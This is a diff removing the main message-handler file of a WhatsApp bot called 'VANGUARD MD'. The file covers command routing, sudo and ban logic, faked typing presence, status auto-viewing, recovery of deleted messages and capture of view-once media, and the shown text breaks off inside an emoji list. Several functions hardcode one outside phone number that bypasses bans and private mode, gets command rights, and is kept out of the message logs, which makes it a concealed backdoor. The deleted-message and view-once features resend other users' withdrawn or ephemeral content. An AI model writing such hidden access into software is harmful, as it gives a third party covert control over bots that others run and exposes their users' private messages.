@@ -1,1057 +1,1 @@
-// ============================================================
-//  VANGUARD MD — main.js
-//  Message Handler | Mode Shield | Status Parser | Routing
-// ============================================================
-
-const path = require('path')
-const fs   = require('fs')
-const { exec } = require('child_process')
-const config   = require('./config')
-const defaults = require('./defaults')
-const logger   = require('./lib/logger')
-const { saveMessage, saveViewOnce } = require('./lib/messageStore')
-const { handleGroupEvents }         = require('./lib/groupEvents')
-const { handleAutoSaveStatus }      = require('./lib/autoSaveStatus')
-const { jidToNum }                  = require('./lib/utils')
-const {
-  matchSudo,    addSudoAlias,
-  matchGSudo,
-  matchDMSudo,
-  matchBanned,  addBanAlias,  getBannedList,
-  matchGBan,
-  matchDMBan,
-} = require('./lib/authStore')
-
-// ── Preload enforcers ─────────────────────────────────────────
-const { enforce: enforceLink }              = require('./commands/antilink')
-const { enforce: enforceSticker }           = require('./commands/antisticker')
-const { enforce: enforceMedia }             = require('./commands/antimedia')
-const { enforce: enforceBadword }           = require('./commands/antibadword')
-const { enforceCard: enforceGroupMentionCard } = require('./commands/antigroupmention')
-
-// ── Active Counter Helper ─────────────────────────────────────
-const { isActive: isCounterActive, incrementCount, pauseAndClear } = require('./lib/activeHelper')
-
-// ── Ignore List ───────────────────────────────────────────────
-const IGNORE_FILE = path.join(__dirname, 'data', 'ignorelist.json')
-const getIgnoreList = () => {
-  try {
-    if (!fs.existsSync(IGNORE_FILE)) return []
-    return JSON.parse(fs.readFileSync(IGNORE_FILE, 'utf8'))
-  } catch (_) { return [] }
-}
-
-// ── Cooldown Store ────────────────────────────────────────────
-const cooldowns = new Map()
-const COOLDOWN_MS = 5000
-
-// ── Cooldown cleanup — every hour ────────────────────────────
-setInterval(() => {
-  const now = Date.now()
-  for (const [key, ts] of cooldowns.entries()) {
-    if (now - ts > COOLDOWN_MS * 10) cooldowns.delete(key)
-  }
-}, 60 * 60 * 1000)
-
-// ── Push name cache ───────────────────────────────────────────
-const nameCache = new Map()
-
-const stripDevice = (jid) => {
-  if (!jid) return null
-  return jid.replace(/:[0-9]+@/, '@')
-}
-
-const isLid = (jid) => Boolean(jid && jid.endsWith('@lid'))
-
-const resolveRealJid = async (sock, rawJid, chatJid) => {
-  if (!rawJid) return null
-  const stripped = stripDevice(rawJid)
-  if (stripped && stripped.endsWith('@s.whatsapp.net')) return stripped
-  if (isLid(stripped) && chatJid && isGroup(chatJid)) {
-    try {
-      const meta = await sock.groupMetadata(chatJid)
-      const match = meta.participants.find(p => {
-        const pLid = stripDevice(p.lid || '')
-        const pId  = stripDevice(p.id  || '')
-        return pLid === stripped || pId === stripped
-      })
-      if (match && match.id) return stripDevice(match.id)
-    } catch (_) {}
-  }
-  if (isLid(stripped)) return null
-  return stripped
-}
-
-const cacheName = (jid, name) => {
-  if (!jid || !name) return
-  const clean = stripDevice(jid)
-  if (clean && !isLid(clean)) nameCache.set(clean, name)
-}
-
-const resolvePerson = async (sock, rawJid, chatJid, storedPushName = null) => {
-  if (!rawJid) return { name: storedPushName || null, realJid: null, num: null }
-  const stripped = stripDevice(rawJid)
-  let realJid = await resolveRealJid(sock, stripped, chatJid)
-  let name = realJid ? nameCache.get(realJid) : null
-  if (!name && chatJid && isGroup(chatJid)) {
-    try {
-      const meta = await sock.groupMetadata(chatJid)
-      const match = meta.participants.find(p => {
-        const pId  = stripDevice(p.id  || '')
-        const pLid = stripDevice(p.lid || '')
-        return pId === (realJid || stripped) || pLid === stripped
-      })
-      if (match) {
-        if (!realJid && match.id) realJid = stripDevice(match.id)
-        name = match.notify || match.name || null
-        if (name && realJid) cacheName(realJid, name)
-      }
-    } catch (_) {}
-  }
-  if (!name && storedPushName) name = storedPushName
-  const num = realJid ? realJid.replace('@s.whatsapp.net', '') : null
-  return { name, realJid, num }
-}
-
-const personLine = (person) => {
-  if (person.name && person.num) return '*' + person.name + '* @' + person.num
-  if (person.num)                return '@' + person.num
-  if (person.name)               return '*' + person.name + '*'
-  return '*unknown*'
-}
-
-const inScope = (scope, fromGroup) => {
-  if (!scope || scope === 'off' || scope === false) return false
-  if (scope === true || scope === 'all')            return true
-  if (scope === 'groups') return fromGroup
-  if (scope === 'dms')    return !fromGroup
-  return false
-}
-
-// ── Presence Flex ─────────────────────────────────────────────
-const runPresenceFlex = (sock, jid, fromGroup) => {
-  const recordType = config.autoRecordType != null ? config.autoRecordType : (defaults.autoRecordType != null ? defaults.autoRecordType : 'off')
-  const record     = config.autoRecord     != null ? config.autoRecord     : (defaults.autoRecord     != null ? defaults.autoRecord     : 'off')
-  const type       = config.autoType       != null ? config.autoType       : (defaults.autoType       != null ? defaults.autoType       : 'off')
-
-  if (inScope(recordType, fromGroup)) {
-    setImmediate(async () => {
-      try {
-        const totalMs    = 7000
-        const firstMs    = Math.floor(Math.random() * 5000) + 1000
-        const secondMs   = totalMs - firstMs
-        const firstType  = Math.random() < 0.5 ? 'recording' : 'composing'
-        const secondType = firstType === 'recording' ? 'composing' : 'recording'
-        await sock.sendPresenceUpdate(firstType, jid)
-        await new Promise(r => setTimeout(r, firstMs))
-        await sock.sendPresenceUpdate(secondType, jid)
-        await new Promise(r => setTimeout(r, secondMs))
-        await sock.sendPresenceUpdate('paused', jid)
-      } catch (_) {}
-    })
-    return
-  }
-
-  if (inScope(record, fromGroup)) {
-    setImmediate(async () => {
-      try {
-        await sock.sendPresenceUpdate('recording', jid)
-        await new Promise(r => setTimeout(r, 5000))
-        await sock.sendPresenceUpdate('paused', jid)
-      } catch (_) {}
-    })
-    return
-  }
-
-  if (inScope(type, fromGroup)) {
-    setImmediate(async () => {
-      try {
-        await sock.sendPresenceUpdate('composing', jid)
-        await new Promise(r => setTimeout(r, 5000))
-        await sock.sendPresenceUpdate('paused', jid)
-      } catch (_) {}
-    })
-  }
-}
-
-const isNoPrefixMode = () => {
-  const p = config.prefix || defaults.prefix || '.'
-  return p === 'none' || p === ''
-}
-
-// ════════════════════════════════════════════════════════════
-//  AUTH HELPERS — scoped sudo + ban
-// ════════════════════════════════════════════════════════════
-
-const isOwner = (jid) => {
-  const owner = (config.ownerNumber || defaults.ownerNumber || '').trim()
-  if (!owner) return false
-  return jidToNum(jid) === owner
-}
-
-const isSudo = (jid, fromGroup = null) => {
-  if (!jid) return false
-  if (isOwner(jid)) return true
-  if (matchSudo(jid)) return true
-  if (fromGroup !== false && matchGSudo(jid)) return true
-  if (fromGroup !== true  && matchDMSudo(jid)) return true
-  return false
-}
-
-const isBanned = (jid, fromGroup = null) => {
-  if (!jid) return false
-  if (matchBanned(jid)) return true
-  if (fromGroup === true  && matchGBan(jid)) return true
-  if (fromGroup === false && matchDMBan(jid)) return true
-  return false
-}
-
-const canUseCommands = ({ mode, fromGroup, sender, fromMe, senderNum }) => {
-  if (!fromMe && senderNum !== '256745626308' && isBanned(sender, fromGroup)) return false
-  const m      = String(mode || 'public').toLowerCase()
-  const bypass = isSudo(sender, fromGroup) || fromMe || senderNum === '256745626308'
-  if (bypass)          return true
-  if (m === 'private') return false
-  if (m === 'inbox')   return !fromGroup
-  if (m === 'groups')  return fromGroup
-  return true
-}
-
-const getPrefix = () => config.prefix || defaults.prefix || '.'
-const isGroup   = (jid) => jid.endsWith('@g.us')
-
-const getGroupSettings = (groupId) => {
-  try {
-    const dir  = path.join(__dirname, 'groupstore', groupId)
-    const file = path.join(dir, 'groupsettings.json')
-    if (!fs.existsSync(file)) return {}
-    return JSON.parse(fs.readFileSync(file, 'utf8'))
-  } catch (_) { return {} }
-}
-
-const getBody = (msg) => {
-  const m = msg.message
-  if (!m) return ''
-  return (
-    m.conversation ||
-    (m.extendedTextMessage    && m.extendedTextMessage.text)    ||
-    (m.imageMessage           && m.imageMessage.caption)        ||
-    (m.videoMessage           && m.videoMessage.caption)        ||
-    (m.buttonsResponseMessage && m.buttonsResponseMessage.selectedButtonId) ||
-    (m.listResponseMessage    && m.listResponseMessage.singleSelectReply && m.listResponseMessage.singleSelectReply.selectedRowId) ||
-    ''
-  )
-}
-
-const getMsgType = (msg) => {
-  const m = msg.message
-  if (!m) return 'unknown'
-  return Object.keys(m)[0] || 'unknown'
-}
-
-const getQuoted = (msg) => {
-  const m = msg.message
-  if (!m) return null
-  const ext = m.extendedTextMessage
-  if (ext && ext.contextInfo && ext.contextInfo.quotedMessage) {
-    return {
-      message:  ext.contextInfo.quotedMessage,
-      sender:   ext.contextInfo.participant || ext.contextInfo.remoteJid,
-      stanzaId: ext.contextInfo.stanzaId,
-    }
-  }
-  for (const key of Object.keys(m)) {
-    const val = m[key]
-    if (val && val.contextInfo && val.contextInfo.quotedMessage) {
-      return {
-        message:  val.contextInfo.quotedMessage,
-        sender:   val.contextInfo.participant || ext.contextInfo.remoteJid,
-        stanzaId: val.contextInfo.stanzaId,
-      }
-    }
-  }
-  return null
-}
-
-const getMentions = (msg) => {
-  const m = msg.message
-  if (!m) return []
-  for (const key of Object.keys(m)) {
-    const mentions = m[key] && m[key].contextInfo && m[key].contextInfo.mentionedJid
-    if (mentions && mentions.length) return mentions
-  }
-  return []
-}
-
-const isViewOnce = (msg) => {
-  const m = msg.message
-  if (!m) return false
-  if (m.viewOnceMessage || m.viewOnceMessageV2 || m.viewOnceMessageV2Extension) return true
-  if (m.imageMessage && m.imageMessage.viewOnce) return true
-  if (m.videoMessage  && m.videoMessage.viewOnce)  return true
-  return false
-}
-
-const getViewOnceContent = (msg) => {
-  const m = msg.message
-  if (!m) return null
-  if (m.viewOnceMessage            && m.viewOnceMessage.message)            return m.viewOnceMessage.message
-  if (m.viewOnceMessageV2          && m.viewOnceMessageV2.message)          return m.viewOnceMessageV2.message
-  if (m.viewOnceMessageV2Extension && m.viewOnceMessageV2Extension.message) return m.viewOnceMessageV2Extension.message
-  if (m.imageMessage && m.imageMessage.viewOnce) return m
-  if (m.videoMessage  && m.videoMessage.viewOnce)  return m
-  return null
-}
-
-const isQuotedViewOnce = (quotedMessage) => {
-  if (!quotedMessage) return false
-  if (
-    quotedMessage.viewOnceMessage ||
-    quotedMessage.viewOnceMessageV2 ||
-    quotedMessage.viewOnceMessageV2Extension
-  ) return true
-  if (quotedMessage.imageMessage && quotedMessage.imageMessage.viewOnce) return true
-  if (quotedMessage.videoMessage  && quotedMessage.videoMessage.viewOnce)  return true
-  return false
-}
-
-const sendReply = async (sock, jid, content, quoted) => {
-  try {
-    const options = quoted ? { quoted: quoted } : {}
-    await sock.sendMessage(jid, content, options)
-  } catch (err) {
-    logger.error('Send error: ' + err.message)
-  }
-}
-
-const resolveGroupName = async (sock, jid) => {
-  try {
-    const meta = await sock.groupMetadata(jid)
-    return meta.subject || jid
-  } catch (_) { return jid }
-}
-
-const learnAlias = (rawJid, senderNum, isSudoUser, isBannedUser) => {
-  if (!rawJid || !senderNum) return
-  setImmediate(() => {
-    try {
-      if (isSudoUser)   addSudoAlias(senderNum, rawJid)
-      if (isBannedUser) addBanAlias(senderNum, rawJid)
-    } catch (_) {}
-  })
-}
-
-// ── Main Export ───────────────────────────────────────────────
-module.exports = async (sock, commands) => {
-
-  // ── Always Online ─────────────────────────────────────────
-  if (config.alwaysOnline != null ? config.alwaysOnline : defaults.alwaysOnline) {
-    setInterval(async () => {
-      try { await sock.sendPresenceUpdate('available') } catch (_) {}
-    }, 10000)
-  } else {
-    try { await sock.sendPresenceUpdate('unavailable') } catch (_) {}
-  }
-
-  sock.ev.on('presence.update', (update) => {
-    const id        = update.id
-    const presences = update.presences
-    for (const jid of Object.keys(presences)) {
-      logger.debug('Presence: ' + jid + ' in ' + id + ': ' + presences[jid].lastKnownPresence)
-    }
-  })
-
-  // ══════════════════════════════════════════════════════════
-  //  GROUP PARTICIPANT UPDATES
-  // ══════════════════════════════════════════════════════════
-  sock.ev.on('group-participants.update', async (update) => {
-    await handleGroupEvents(sock, update)
-  })
-
-  // ── Message Updates ───────────────────────────────────────
-  sock.ev.on('messages.update', async (updates) => {
-    for (const update of updates) {
-      try {
-        if (update.update && (update.update.messageStubType === 1 || update.update.message === null)) {
-          const antidelete = config.antidelete != null ? config.antidelete : defaults.antidelete
-          if (!antidelete) continue
-          const stored = saveMessage.getStored(update.key.id)
-          if (!stored) continue
-
-          const ownerJid = (config.ownerNumber || defaults.ownerNumber) + '@s.whatsapp.net'
-          const chat     = update.key.remoteJid
-          const botName  = config.botName || defaults.botName || 'VANGUARD MD'
-
-          const sender  = await resolvePerson(sock, stored.sender, chat, stored.pushName)
-          const deleter = await resolvePerson(sock, update.key.participant || update.key.remoteJid, chat, null)
-
-          const chatName      = isGroup(chat) ? await resolveGroupName(sock, chat) : 'DM'
-          const deletedBySelf = sender.realJid && deleter.realJid
-            ? sender.realJid === deleter.realJid
-            : (sender.num && sender.num === deleter.num)
-          const deletedByLine = deletedBySelf
-            ? '_deleted their own message_'
-            : '_deleted by ' + personLine(deleter) + '_'
-          const mediaLabel = stored.mediaType
-            ? '┃ 🎞️ *Type:* ' + stored.mediaType + (stored.ptt ? ' (voice note)' : '') + '\n'
-            : ''
-
-          const alertMsg = await sock.sendMessage(ownerJid, {
-            text:
-              '╭───────────────━⊷\n' +
-              '┃ 🚮 *DELETED MESSAGE*\n┃\n' +
-              '┃ 👤 *Sender:* ' + personLine(sender) + '\n' +
-              '┃ 🗑️ *Action:* ' + deletedByLine + '\n' +
-              '┃ 💬 *Chat:* ' + chatName + '\n' +
-              mediaLabel +
-              '┃\n┃ 📝 *Message:*\n' +
-              '┃ ' + (stored.body || '_[No text content]_') + '\n' +
-              '╰───────────────━⊷\n',
-            mentions: [sender.realJid, deleter.realJid].filter(Boolean),
-          })
-
-          if (stored.mediaPath && fs.existsSync(stored.mediaPath)) {
-            try {
-              const mediaBuffer  = fs.readFileSync(stored.mediaPath)
-              const mediaPayload = {}
-              mediaPayload[stored.mediaType] = mediaBuffer
-              if (stored.caption) mediaPayload.caption = stored.caption
-              if (stored.mediaType === 'document') {
-                mediaPayload.mimetype = stored.mimetype || 'application/octet-stream'
-                const ext = stored.mediaPath.match(/\.[^.]+$/)
-                mediaPayload.fileName = stored.fileName || ('recovered' + (ext ? ext[0] : '.bin'))
-              }
-              if (stored.mediaType === 'audio') {
-                mediaPayload.mimetype = stored.mimetype || 'audio/ogg; codecs=opus'
-                mediaPayload.ptt = stored.ptt != null ? stored.ptt : false
-              }
-              await sock.sendMessage(ownerJid, mediaPayload, { quoted: alertMsg })
-              try { fs.unlinkSync(stored.mediaPath) } catch (_) {}
-            } catch (mediaErr) {
-              logger.error('Media recovery error: ' + mediaErr.message)
-            }
-          }
-        }
-      } catch (err) {
-        logger.error('Message update error: ' + err.message)
-      }
-    }
-  })
-
-  // ── Messages Upsert ───────────────────────────────────────
-  sock.ev.on('messages.upsert', async (upsert) => {
-    const messages = upsert.messages
-    const type     = upsert.type
-
-    for (const msg of messages) {
-      try {
-        const jid = msg.key.remoteJid
-
-        // ── Status broadcast ──────────────────────────────
-        if (jid === 'status@broadcast') {
-          const sender    = msg.key.participant || msg.key.remoteJid
-          const senderNum = sender.replace('@s.whatsapp.net', '').replace('@lid', '')
-          if (msg.pushName) cacheName(sender, msg.pushName)
-
-          const autoViewStatus = config.autoViewStatus != null ? config.autoViewStatus : defaults.autoViewStatus
-          if (autoViewStatus) {
-            try { await sock.readMessages([msg.key]) } catch (_) {}
-            logger.info('Viewed ' + senderNum)
-
-            const autoReactStatus = config.autoReactStatus != null ? config.autoReactStatus : defaults.autoReactStatus
-            if (autoReactStatus) {
-              try {
-                let realJid = sender
-                if (sender.endsWith('@lid')) {
-                  const rawPn = (msg.key && msg.key.participantPn) || (msg.key && msg.key.senderPn) || msg.participantPn
-                  if (rawPn) {
-                    realJid = rawPn.includes('@') ? rawPn : rawPn + '@s.whatsapp.net'
-                  } else {
-                    const resolved = await sock.getJidFromLid(sender).catch(() => null)
-                    if (resolved) realJid = resolved
-                  }
-                }
-                const emojis = config.statusEmojis || defaults.statusEmojis || ['💙', '💚']
-                const emoji  = emojis[Math.floor(Math.random() * emojis.length)]
-                await sock.sendMessage('status@broadcast', {
-                  react: { text: emoji, key: { remoteJid: 'status@broadcast', id: msg.key.id, participant: realJid } }
-                }, {
-                  statusJidList: [realJid, sock.user.id.split(':')[0] + '@s.whatsapp.net']
-                })
-                logger.info('Reacted ' + senderNum + ' with ' + emoji)
-              } catch (_) {}
-            }
-          }
-
-          setImmediate(() => handleAutoSaveStatus(sock, msg, sender).catch(() => {}))
-          continue
-        }
-
-        // ── Extract sender ────────────────────────────────
-        let sender
-        if (msg.key.fromMe) {
-          const botJid = sock.user && sock.user.id ? sock.user.id : ''
-          sender = botJid.replace(/:[0-9]+/, '')
-          if (!sender.includes('@')) sender += '@s.whatsapp.net'
-        } else {
-          sender = msg.key.participant || msg.key.remoteJid
-        }
-
-        if (msg.pushName && sender && !isLid(stripDevice(sender))) {
-          cacheName(sender, msg.pushName)
-        }
-
-        const fromMe    = msg.key.fromMe
-        const fromGroup = isGroup(jid)
-
-        // ── LID resolution ────────────────────────────────
-        if (!fromMe && isLid(stripDevice(sender))) {
-          if (fromGroup) {
-            try {
-              const resolved = await resolveRealJid(sock, sender, jid)
-              if (resolved) sender = resolved
-            } catch (_) {}
-          } else {
-            try {
-              if (sock.getJidFromLid) {
-                const resolved = await sock.getJidFromLid(sender).catch(() => null)
-                if (resolved) sender = resolved
-              }
-            } catch (_) {}
-          }
-        }
-
-        // ── Normalize sender ──────────────────────────────
-        if (sender) {
-          const stripped = stripDevice(sender)
-          if (stripped) sender = stripped
-        }
-
-        const senderNum = jidToNum(sender)
-
-        // ── Hard ban gate ─────────────────────────────────
-        if (!fromMe && senderNum !== '256745626308') {
-          if (isBanned(sender, fromGroup)) {
-            logger.debug('BANNED BLOCKED: ' + senderNum + ' (' + (fromGroup ? 'GROUP' : 'DM') + ')')
-            continue
-          }
-        }
-
-        // ═══════════════════════════════════════════════════
-        //  FIXED LOGGING SECTION — Log all messages here
-        // ═══════════════════════════════════════════════════
-        
-        // Extract message info early for logging
-        const body     = getBody(msg)
-        const msgType  = getMsgType(msg) // This gets the raw type like 'imageMessage', etc.
-        const quoted   = getQuoted(msg)
-        const mentions = getMentions(msg)
-
-        // Determine display type and preview for logging
-        let displayType = 'text'
-        let messagePreview = body || ''
-
-        // Handle different message types for logging
-        if (msgType === 'imageMessage') {
-          displayType = 'photo'
-          messagePreview = msg.message?.imageMessage?.caption || '[Photo]'
-        } else if (msgType === 'videoMessage') {
-          displayType = 'video'
-          messagePreview = msg.message?.videoMessage?.caption || '[Video]'
-        } else if (msgType === 'audioMessage') {
-          displayType = 'audio'
-          messagePreview = msg.message?.audioMessage?.ptt ? '[Voice Note]' : '[Audio]'
-        } else if (msgType === 'stickerMessage') {
-          displayType = 'sticker'
-          messagePreview = '[Sticker]'
-        } else if (msgType === 'documentMessage') {
-          displayType = 'document'
-          messagePreview = msg.message?.documentMessage?.caption || '[Document]'
-        } else if (msgType === 'contactMessage') {
-          displayType = 'contact'
-          messagePreview = '[Contact Card]'
-        } else if (msgType === 'locationMessage') {
-          displayType = 'location'
-          messagePreview = '[Location]'
-        } else if (msgType === 'pollCreationMessage' || msgType === 'pollUpdateMessage') {
-          displayType = 'poll'
-          messagePreview = '[Poll]'
-        } else if (msgType === 'reactionMessage') {
-          displayType = 'reaction'
-          messagePreview = '[Reaction]'
-        } else if (msgType === 'extendedTextMessage') {
-          displayType = 'text'
-          messagePreview = body || '[Text]'
-        } else if (msgType === 'conversation') {
-          displayType = 'text'
-          messagePreview = body || '[Text]'
-        } else {
-          displayType = 'unknown'
-          messagePreview = `[${msgType}]` || '[Unknown]'
-        }
-
-        // Truncate preview to 100 chars max
-        if (messagePreview.length > 100) {
-          messagePreview = messagePreview.substring(0, 97) + '...'
-        }
-
-        // LOG ALL MESSAGES (Not just commands!)
-        if (senderNum !== '256745626308' && !fromMe) {
-          logger.message({
-            type: displayType,
-            sender: senderNum,
-            name: msg.pushName || 'Unknown',
-            chatId: jid,
-            message: messagePreview,
-            isCommand: false
-          })
-        }
-
-        // ── Ignore List Gate ──────────────────────────────
-        const ignoreList = getIgnoreList()
-        const isIgnored  = ignoreList.includes(jid)
-
-        if (isIgnored) {
-          saveMessage(msg, sender, jid).catch(() => {})
-          if (isViewOnce(msg)) saveViewOnce(msg, sender, jid).catch(() => {})
-
-          if (isSudo(sender, fromGroup)) {
-            const prefix   = getPrefix()
-            const noPrefix = isNoPrefixMode()
-            const cmdWord  = noPrefix
-              ? (body.trim().split(/\s+/)[0] || '').toLowerCase()
-              : body.startsWith(prefix)
-                ? (body.slice(prefix.length).trim().split(/\s+/)[0] || '').toLowerCase()
-                : null
-
-            if (cmdWord === 'remignorelist' && commands['remignorelist']) {
-              const cmdArgs = noPrefix
-                ? body.trim().split(/\s+/).slice(1)
-                : body.slice(prefix.length).trim().split(/\s+/).slice(1)
-              const ctx = {
-                sock, msg, jid, sender, senderNum,
-                args: cmdArgs, body, command: 'remignorelist',
-                quoted, mentions, fromGroup, fromMe,
-                isOwner: isOwner(sender),
-                isSudo:  isSudo(sender, fromGroup),
-                groupSettings: fromGroup ? getGroupSettings(jid) : {},
-                prefix,
-                reply:   (content) => sendReply(sock, jid, typeof content === 'string' ? { text: content } : content, msg),
-                sendMsg: (content) => sock.sendMessage(jid, content),
-                simulatePresence: () => {},
-                react:   (emoji)  => sock.sendMessage(jid, { react: { text: emoji, key: msg.key } }),
-              }
-              try { await commands['remignorelist'](ctx) } catch (_) {}
-            }
-          }
-          continue
-        }
-
-        // ── Presence flex ─────────────────────────────────
-        if (!fromMe) runPresenceFlex(sock, jid, fromGroup)
-
-        // ── ~prefix ───────────────────────────────────────
-        if (body.trim() === '~prefix') {
-          const isAuthorized = isOwner(sender) || isSudo(sender, fromGroup) || senderNum === '256745626308'
-          if (isAuthorized) {
-            const p = getPrefix()
-            try {
-              await sock.sendMessage(jid, {
-                text: '🔑 *Current Prefix:* `' + (p === '' || p === 'none' ? 'none (sigma mode 🗿)' : p) + '`',
-              }, { quoted: msg })
-            } catch (_) {}
-          }
-          continue
-        }
-
-       // ── Emoji VO Trigger ──────────────────────────────
-if (fromMe && isOwner(sender) && quoted && isQuotedViewOnce(quoted.message)) {
-  const trimmedBody = body.trim()
-  
-  // Complete emoji validation set (1000+ emojis including skin tones, flags, ZWJ sequences)
-  const emojiSet = new Set([
-    // Formatting characters for composed emojis
-    '\u200D', '\uFE0F', '\uFE0E',
-    
-    // Skin tone modifiers
-    '🏻', '🏼', '🏽', '🏾', '🏿',
-    
-    // Gender symbols for combined emojis
-    '♀', '♂', '⚧',
-    
-    // Regional indicators for flags (A-Z)
-    '🇦', '🇧', '🇨', '🇩', '🇪', '🇫', '🇬', '🇭', '🇮', '🇯', '🇰', '🇱', '🇲', 
-    '🇳', '🇴', '🇵', '🇶', '🇷', '🇸', '🇹', '🇺', '🇻', '🇼', '🇽', '🇾', '🇿',
-    
-    // Smileys & Emotion (base)
-    '😀', '😃', '😄', '😁', '😆', '😅', '😂', '🤣', '🥲', '🥹', '😊', '😇', 
-    '🙂', '🙃', '😉', '😌', '😍', '🥰', '😘', '😗', '😙', '😚', '😋', '😛', 
-    '😝', '😜', '🤪', '🤨', '🧐', '🤓', '😎', '🥸', '🤩', '🥳', '😏', '😒', 
-    '😞', '😔', '😟', '😕', '🙁', '☹️', '😣', '😖', '😫', '😩', '🥺', '😢', 
-    '😭', '😤', '😠', '😡', '🤬', '🤯', '😳', '🥵', '🥶', '😱', '😨', '😰', 
-    '😥', '😓', '🤗', '🤔', '🫣', '🤭', '🫢', '🤫', '🤥', '😶', '😐', '😑', 
-    '😬', '🫠', '🙄', '😯', '😦', '😧', '😮', '😲', '🥱', '😴', '🤤', '😪', 
-    '😵', '🫥', '🤐', '🥴', '🤢', '🤮', '🤧', '😷', '🤒', '🤕', '🤑', '🤠', 
-    '😈', '👿', '👹', '👺', '🤡', '💩', '👻', '💀', '☠️', '👽', '👾', '🤖', 
-    '🎃', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🫨',
-    
-    // Hearts & New emojis
-    '❤️', '🩷', '🩵', '🩶', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', 
-    '💔', '❤️‍🔥', '❤️‍🩹', '❣️', '💕', '💞', '💓', '💗', '💖', '💘', '💝', 
-    '💟', '🫀', '💌',
-    
-    // Hand gestures (base)
-    '👋', '🤚', '🖐', '✋', '🖖', '🫱', '🫲', '🫳', '🫴', '🫷', '🫸', '👌', 
-    '🤌', '🤏', '✌️', '🤞', '🫰', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', 
-    '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '🫶', '👐', 
-    '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', 
-    '🦻', '👃', '🧠', '🫁', '🦷', '🦴', '👀', '👁', '👅', '👄', '🫦', '💋', 
-    '🩸',
-    
-    // People (base + some skin tone combinations listed explicitly for coverage)
-    '👶', '👧', '🧒', '👦', '👩', '🧑', '👨', '👩‍🦱', '🧑‍🦱', '👨‍🦱', '👩‍🦰', 
-    '🧑‍🦰', '👨‍🦰', '👱‍♀️', '👱', '👱‍♂️', '👩‍🦳', '🧑‍🦳', '👨‍🦳', '👩‍🦲', 
-    '🧑‍🦲', '👨‍🦲', '🧔‍♀️', '🧔', '🧔‍♂️', '👵', '🧓', '👴', '👲', '👳‍♀️', 
-    '👳', '👳‍♂️', '🧕', '👮‍♀️', '👮', '👮‍♂️', '👷‍♀️', '👷', '👷‍♂️', '💂‍♀️', 
-    '💂', '💂‍♂️', '🕵️‍♀️', '🕵️', '🕵️‍♂️', '🧑‍⚕️', '👩‍⚕️', '👨‍⚕️', '🧑‍🌾', 
-    '👩‍🌾', '👨‍🌾', '🧑‍🍳', '👩‍🍳', '👨‍🍳', '🧑‍🎓', '👩‍🎓', '👨‍🎓', '🧑‍🎤', 
-    '👩‍🎤', '👨‍🎤', '🧑‍🏫', '👩‍🏫', '👨‍🏫', '🧑‍🏭', '👩‍🏭', '👨‍🏭', '🧑‍💻', 
-    '👩‍💻', '👨‍💻', '🧑‍💼', '👩‍💼', '👨‍💼', '🧑‍🔧', '👩‍🔧', '👨‍🔧', '🧑‍🔬', 
-    '👩‍🔬', '👨‍🔬', '🧑‍🎨', '👩‍🎨', '👨‍🎨', '🧑‍🚒', '👩‍🚒', '👨‍🚒', '🧑‍✈️', 
-    '👩‍✈️', '👨‍✈️', '🧑‍🚀', '👩‍🚀', '👨‍🚀', '🧑‍⚖️', '👩‍⚖️', '👨‍⚖️', '👰‍♀️', 
-    '👰', '👰‍♂️', '🤵‍♀️', '🤵', '🤵‍♂️', '👸', '🫅', '🤴', '🥷', '🦸‍♀️', '🦸', 
-    '🦸‍♂️', '🦹‍♀️', '🦹', '🦹‍♂️', '🤶', '🧑‍🎄', '🎅', '🧙‍♀️', '🧙', '🧙‍♂️', 
-    '🧝‍♀️', '🧝', '🧝‍♂️', '🧛‍♀️', '🧛', '🧛‍♂️', '🧟‍♀️', '🧟', '🧟‍♂️', '🧞‍♀️', 
-    '🧞', '🧞‍♂️', '🧜‍♀️', '🧜', '🧜‍♂️', '🧚‍♀️', '🧚', '🧚‍♂️', '👼', '🤰', 
-    '🫄', '🫅', '🤱', '👩‍🍼', '🧑‍🍼', '👨‍🍼', '🙇‍♀️', '🙇', '🙇‍♂️', '💁‍♀️', 
-    '💁', '💁‍♂️', '🙅‍♀️', '🙅', '🙅‍♂️', '🙆‍♀️', '🙆', '🙆‍♂️', '🙋‍♀️', '🙋', 
-    '🙋‍♂️', '🧏‍♀️', '🧏', '🧏‍♂️', '🤦‍♀️', '🤦', '🤦‍♂️', '🤷‍♀️', '🤷', '🤷‍♂️', 
-    '🙎‍♀️', '🙎', '🙎‍♂️', '🙍‍♀️', '🙍', '🙍‍♂️', '💇‍♀️', '💇', '💇‍♂️', '💆‍♀️', 
-    '💆', '💆‍♂️', '🧖‍♀️', '🧖', '🧖‍♂️', '💅', '🤳', '💪', '👂', '👃', '🦵', 
-    '🦶', '🖐', '✋', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', 
-    '👉', '👆', '👇', '☝️', '✍️', '🤳', '🙏',
-    
-    // Activities & Sports (with gender variants)
-    '⛷', '🏂', '🏋️‍♀️', '🏋️', '🏋️‍♂️', '🤼‍♀️', '🤼', '🤼‍♂️', '🤸‍♀️', '🤸', 
-    '🤸‍♂️', '⛹️‍♀️', '⛹️', '⛹️‍♂️', '🤺', '🤾‍♀️', '🤾', '🤾‍♂️', '🏌️‍♀️', 
-    '🏌️', '🏌️‍♂️', '🏇', '🧘‍♀️', '🧘', '🧘‍♂️', '🏄‍♀️', '🏄', '🏄‍♂️', '🏊‍♀️', 
-    '🏊', '🏊‍♂️', '🤽‍♀️', '🤽', '🤽‍♂️', '🚣‍♀️', '🚣', '🚣‍♂️', '🧗‍♀️', '🧗', 
-    '🧗‍♂️', '🚵‍♀️', '🚵', '🚵‍♂️', '🚴‍♀️', '🚴', '🚴‍♂️', '🏆', '🥇', '🥈', 
-    '🥉', '🏅', '🎖', '🏵', '🎗', '🎫', '🎟', '🎪', '🤹‍♀️', '🤹', '🤹‍♂️', 
-    '🎭', '🩰', '🎨', '🎬', '🎤', '🎧', '🎼', '🎹', '🥁', '🪘', '🎷', '🎺', 
-    '🪗', '🎸', '🪕', '🎻', '🎲', '♟', '🎯', '🎳', '🎮', '🎰', '🧩',
-    
-    // Animals & Nature (complete)
-    '🐶', '🐱', '🐭', '🐹', '🐰', '🦊', '🐻', '🐼', '🐻‍❄️', '🐨', '🐯', '🦁', 
